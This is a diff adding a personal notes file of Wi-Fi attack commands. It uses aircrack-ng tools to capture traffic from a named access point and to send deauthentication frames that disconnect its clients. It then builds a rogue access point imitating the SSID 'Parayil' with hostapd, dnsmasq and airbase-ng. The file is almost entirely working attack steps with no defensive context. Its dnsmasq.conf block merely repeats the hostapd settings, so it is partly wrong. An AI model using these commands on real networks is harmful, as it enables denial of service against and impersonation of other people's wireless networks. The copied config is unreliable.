@@ -1,0 +1,55 @@
+To test injection is working:
+	sudo aireplay-ng --test wlan1mon    
+To view monitor mode:
+	sudo airodump-ng wlan1mon       
+packet capturing:
+	 sudo airodump-ng --bssid BC:62:D2:24:CF:E8 -c 1 -w capture wlan1mon  
+	 
+	 -c channel number
+	 -w file name
+deauthentication(to disconnect connected networks) :
+	sudo aireplay-ng --deauth 10 -a BC:62:D2:24:CF:E8 wlan1mon
+opening the captured file:
+	wireshark capture-01.cap
+if hostapd and dnsmasq is not installed use the following command
+	sudo apt-get install hostapd dnsmasq
+create a file 'hostapd.conf' containing :
+
+	#Set wireless interface
+	interface=wlan0mon
+
+	#Set network name
+	ssid=Parayil
+
+	#Set channel
+	channel=1
+
+	#Set driver
+	driver=nl80211
+
+create a file 'dnsmasq.conf' containing :
+
+	#Set wireless interface
+	interface=wlan0mon
+
+	#Set network name
+	ssid=Parayil
+
+	#Set channel
+	channel=1
+
+	#Set driver
+	driver=nl80211
+
+
+type :
+	sudo dnsmasq -C dnsmasq.conf
+type :
+	sudo hostapd hostapd.conf
+type :
+	sudo airbase-ng -e Parayil -c 1 wlan0mon          
+open new cmd and type :
+	sudo ifconfig wlan0mon 192.168.1.1/24 
+
+
+
